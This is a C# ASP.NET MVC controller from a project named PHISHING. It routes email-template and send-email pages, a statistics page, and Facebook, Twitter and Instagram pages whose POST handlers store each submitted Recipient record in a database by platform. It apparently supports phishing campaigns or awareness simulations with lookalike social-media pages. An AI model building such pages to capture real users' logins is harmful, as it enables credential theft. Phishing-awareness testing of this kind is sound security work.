﻿using PHISHING.Models;
using System.Linq;
using System.Web.Configuration;
using System.Web.Mvc;

namespace PHISHING.Controllers
{
    public class HomeController : Controller
    {
        public ActionResult Index()
        {
            return View();
        }

        public ActionResult AboutPhishing()
        {
            ViewBag.Message = "Your about phishing page.";

            return View();
        }

        public ActionResult Login()
        {
            ViewBag.Message = "Your login page.";

            return View();
        }

        public ActionResult SendEmail()
        {
            ViewBag.Message = "Your start page.";

            return View();
        }

        public ActionResult CreateEmailTemplate()
        {
            ViewBag.Message = "Your create email template page.";

            return View();
        }


        public ActionResult ShowStatistics()
        {
            ViewBag.Message = "Your statistics page.";

            return View();
        }
        [HttpGet]
        public ActionResult Facebook()
        {
            try
            {
                
                return View();
            }
            catch (System.Exception ex)
            {
                ModelState.AddModelError("", ex.Message);
                return View();
            }
        }
        [HttpPost]
        public ActionResult Facebook(Recipient recipient)
        {
            try
            {
                using (var db = new Models.Context.WEBContext())
                {
                    
                    recipient.TypeID = 2;
                    db.Set<Recipient>().Add(recipient);
                    db.SaveChanges();
                }
                return View();
            }
            catch (System.Exception ex)
            {
                ModelState.AddModelError("", ex.Message);
                return View();
            }
        }

        public ActionResult Twitter()
        {
            try
            {

                return View();
            }
            catch (System.Exception ex)
            {
                ModelState.AddModelError("", ex.Message);
                return View();
            }
        }
        [HttpPost]
        public ActionResult Twitter(Recipient recipient)
        {
            try
            {
                using (var db = new Models.Context.WEBContext())
                {
                    recipient.TypeID = 3;

                    db.Set<Recipient>().Add(recipient);
                    db.SaveChanges();
                }
                return View();
            }
            catch (System.Exception ex)
            {
                ModelState.AddModelError("", ex.Message);
                return View();
            }
        }

        public ActionResult Instagram()
        {
            try
            {

                return View();
            }
            catch (System.Exception ex)
            {
                ModelState.AddModelError("", ex.Message);
                return View();
            }
        }
        public ActionResult Instagram(Recipient recipient)
        {
            try
            {
                using (var db = new Models.Context.WEBContext())
                {
                    recipient.TypeID = 1;

                    db.Set<Recipient>().Add(recipient);
                    db.SaveChanges();
                }
                return View();
            }
            catch (System.Exception ex)
            {
                ModelState.AddModelError("", ex.Message);
                return View();
            }
        }

        public ActionResult Contact()
        {
            ViewBag.Message = "Your contact page.";

            return View();
        }
        


       

    }
}